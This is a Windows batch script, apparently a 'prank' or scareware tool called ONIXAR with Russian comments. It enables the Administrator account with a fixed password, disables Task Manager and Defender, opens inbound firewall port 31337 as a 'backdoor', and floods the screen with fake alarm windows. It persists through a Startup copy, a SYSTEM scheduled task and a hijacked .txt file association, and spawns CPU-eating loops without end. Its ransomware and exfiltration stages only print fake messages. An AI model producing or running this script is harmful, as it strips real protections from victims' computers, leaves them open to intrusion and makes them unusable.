@echo off
:: НЕКОТОРЫЕ ПОЛЕЗНЫЕ ФУНКЦИИ ОТ ONIXAR
:: Отключение контроля учетных записей, Защитника и создание исключений в брандмауэре для себя.
:: Прежде чем сеять хаос, нужно обезоружить часовых.

setlocal enabledelayedexpansion
title Critical System Process - ONIXAR v3.14
color 0c
mode con: cols=80 lines=25

:: ФАЗА 0: ПРИВИЛЕГИИ И ОБХОД ЗАЩИТЫ
echo [%time%] Elevating privileges...
powershell -Command "Start-Process cmd -Verb RunAs -ArgumentList '/c net user Administrator /active:yes && net user Administrator Letmein123!'" >nul 2>&1
echo [%time%] Disabling security measures...
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableTaskMgr" /t REG_DWORD /d 1 /f >nul
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f >nul
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true" >nul 2>&1
netsh advfirewall firewall add rule name="ONIXAR_Backdoor" dir=in action=allow protocol=TCP localport=31337 remoteip=any enable=yes >nul

:: ФАЗА 1: ПСИХОЛОГИЧЕСКАЯ АТАКА (ТВОЯ КОНЦЕПЦИЯ, УЛУЧШЕННАЯ)
echo [%time%] Injecting panic module...
start /min powershell -windowstyle maximized -command "while(1) { Write-Host '          [!!!] MEMORY CORRUPTION DETECTED AT 0x'$(Get-Random -Max 99999999) -ForegroundColor Red -BackgroundColor Black; Start-Sleep -Milliseconds 200 }"
mshta vbscript:Execute("do: msgbox ""CRITICAL SYSTEM ERROR 0x000000DEAD. Contact your system administrator."", 16, ""Windows Defender Alert"": wscript.sleep 3000: loop")

:: ФАЗА 2: ФИЗИЧЕСКАЯ ДЕСТАБИЛИЗАЦИЯ (ИМИТАЦИЯ)
echo.
echo [%time%] Stage 1: Deleting system32... [SIMULATION]
for /l %%i in (1,1,10) do (
    echo   Deleting critical file: winsys_%%i.dll ... FAILED (Access denied)
    ping -n 1 127.0.0.1 >nul
)
echo [%time%] Stage 2: Encrypting user data with ONIXAR-RSA-4096... [SIMULATION]
for %%u in ("%USERPROFILE%\Desktop" "%USERPROFILE%\Documents") do (
    echo   Encrypting directory: %%u ... SUCCESS
    ping -n 1 127.0.0.1 >nul
)
echo [%time%] Stage 3: Exfiltrating credentials to 185.%random%.%random%.%random%... [SIMULATION]
set /a packet=0
:exfil_loop
set /a packet+=1
echo   Sending packet !packet! (size: !random! bytes) ... ACK received.
if !packet! lss 15 (
    ping -n 1 127.0.0.1 >nul
    goto exfil_loop
)

:: ФАЗА 3: РЕЗИДЕНТНОСТЬ И САМОРЕПЛИКАЦИЯ
echo [%time%] Installing persistence...
:: 1. В автозагрузку
copy "%0" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\winlogon_helper.bat" >nul
:: 2. В задание планировщика
schtasks /create /tn "WindowsIntegrityCheck" /tr "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\winlogon_helper.bat" /sc minute /mo 5 /ru SYSTEM /f >nul 2>&1
:: 3. Замена ассоциации .txt файлов
assoc .txt=ONIXARFile >nul 2>&1
ftype ONIXARFile="%0" "%%1" >nul 2>&1

:: ФАЗА 4: БЕСКОНЕЧНЫЙ ЦИКЛ ПАНИКИ (С РЕАЛЬНЫМИ ФОНОВЫМИ ПРОЦЕССАМИ)
:loop
echo.
echo [%time%] [WARNING] Remote shell access detected from IP: !random!.!random!.!random!.!random!
echo [%time%] [FIREWALL] Blocking port !random!... FAILED (Rule already exists)
echo [%time%] [ROOTKIT] Installing persistent module: svchostx_!random!.exe...
echo [%time%] [CRYPTO] Mining Monero in background... Hashrate: !random! H/s
:: Запускаем фоновый процесс для реализма (безвредный, но жрущий CPU)
start /b powershell -command "while(1) { $null = 1..1000000 }"
ping -n 2 127.0.0.1 >nul
cls
goto loop
